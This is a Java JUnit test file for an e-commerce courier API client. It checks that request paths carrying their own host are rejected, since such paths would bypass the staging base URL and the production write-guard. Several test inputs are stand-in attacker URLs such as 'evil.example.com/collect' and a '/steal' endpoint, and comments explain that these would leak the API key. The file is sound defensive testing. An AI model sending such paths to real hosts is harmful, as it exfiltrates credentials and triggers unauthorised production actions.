package com.buyology.ecommerce.quiqup.service;

import com.buyology.ecommerce.quiqup.config.QuiqupProperties;
import com.buyology.ecommerce.quiqup.dto.QuiqupApiResult;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Pins that a Quiqup call cannot be aimed away from the configured base URL.
 *
 * <p>Without this the production write-guard is decorative rather than protective.
 * {@code WebClient.uri(String)} ignores the configured base URL as soon as the argument carries its
 * own scheme and host, while the guard only ever inspects {@code quiqup.base-url} — so an absolute
 * path reached any host it named while both the guard and the admin config page still reported that
 * we were pointed at staging. Two things followed, either one serious on its own: a write against
 * Quiqup production dispatched a real courier on the live account with
 * {@code allow-production-writes} still false, and because every request carries the auth headers,
 * an arbitrary host was handed the Quiqup API key.
 *
 * <p>The guard runs before any network call, so these assertions need no server and no credentials
 * — a rejected call never reaches the client.
 */
class QuiqupClientPathGuardTest {

    /** Staging base URL and writes disallowed: the configuration a deployment actually ships with. */
    private static QuiqupClient client() {
        QuiqupProperties props = new QuiqupProperties();
        props.setEnabled(true);
        props.setBaseUrl("https://api.staging.quiqup.com");
        props.setApiKey("test-key-not-a-real-credential");
        props.setAllowProductionWrites(false);
        return new QuiqupClient(props, new ObjectMapper());
    }

    private static void assertRejected(String path) {
        QuiqupApiResult result = client().request("POST", path, null);

        assertNotNull(result, "a blocked call must return a result, not null");
        assertEquals(400, result.status(), "rejected before any network call: " + path);
        assertFalse(result.ok());
        assertTrue(String.valueOf(result.body()).contains("not a path relative"),
                "the message must say why: " + result.body());
    }

    @Test
    void refusesAnAbsoluteUrlAimedAtQuiqupProduction() {
        // The exact bypass: staging configured, production writes off, yet this would have
        // dispatched a real courier on the live account.
        assertRejected("https://api-ae.quiqup.com/orders");
    }

    @Test
    void refusesAnAbsoluteUrlAimedAtAnAttackerHost() {
        // Every request carries the API key, so an arbitrary host is credential exfiltration.
        assertRejected("https://evil.example.com/collect");
        assertRejected("http://127.0.0.1:8080/steal");
    }

    @Test
    void refusesAProtocolRelativeUrl() {
        // Names a host without naming a scheme, and resolves away from the base URL just as fully.
        assertRejected("//evil.example.com/collect");
    }

    @Test
    void refusesAPathThatIsNotRootedAtAll() {
        assertRejected("orders");
        assertRejected("");
        assertRejected("   ");
    }

    @Test
    void refusesABackslashPath() {
        assertRejected("\\\\evil.example.com\\collect");
    }

    @Test
    void aRelativePathIsNotRejectedByThisGuard() {
        // It must fall through to the write-guard, not be stopped here. Staging is configured, so
        // the write-guard permits it too and the call proceeds to the network — which fails with no
        // reachable host. Any outcome other than the 400 above proves the path itself was accepted.
        QuiqupApiResult result = client().request("POST", "/orders", null);

        assertNotNull(result);
        assertNotEquals(400, result.status(),
                "a leading-slash path must pass the relative-path guard");
    }

    @Test
    void readsAreGuardedToo() {
        // A GET is exempt from the production write-guard, so without the path guard it was a
        // straightforward way to send the API key anywhere.
        QuiqupApiResult result = client().request("GET", "https://evil.example.com/collect", null);

        assertEquals(400, result.status(), "a read to an arbitrary host still leaks the key");
    }
}
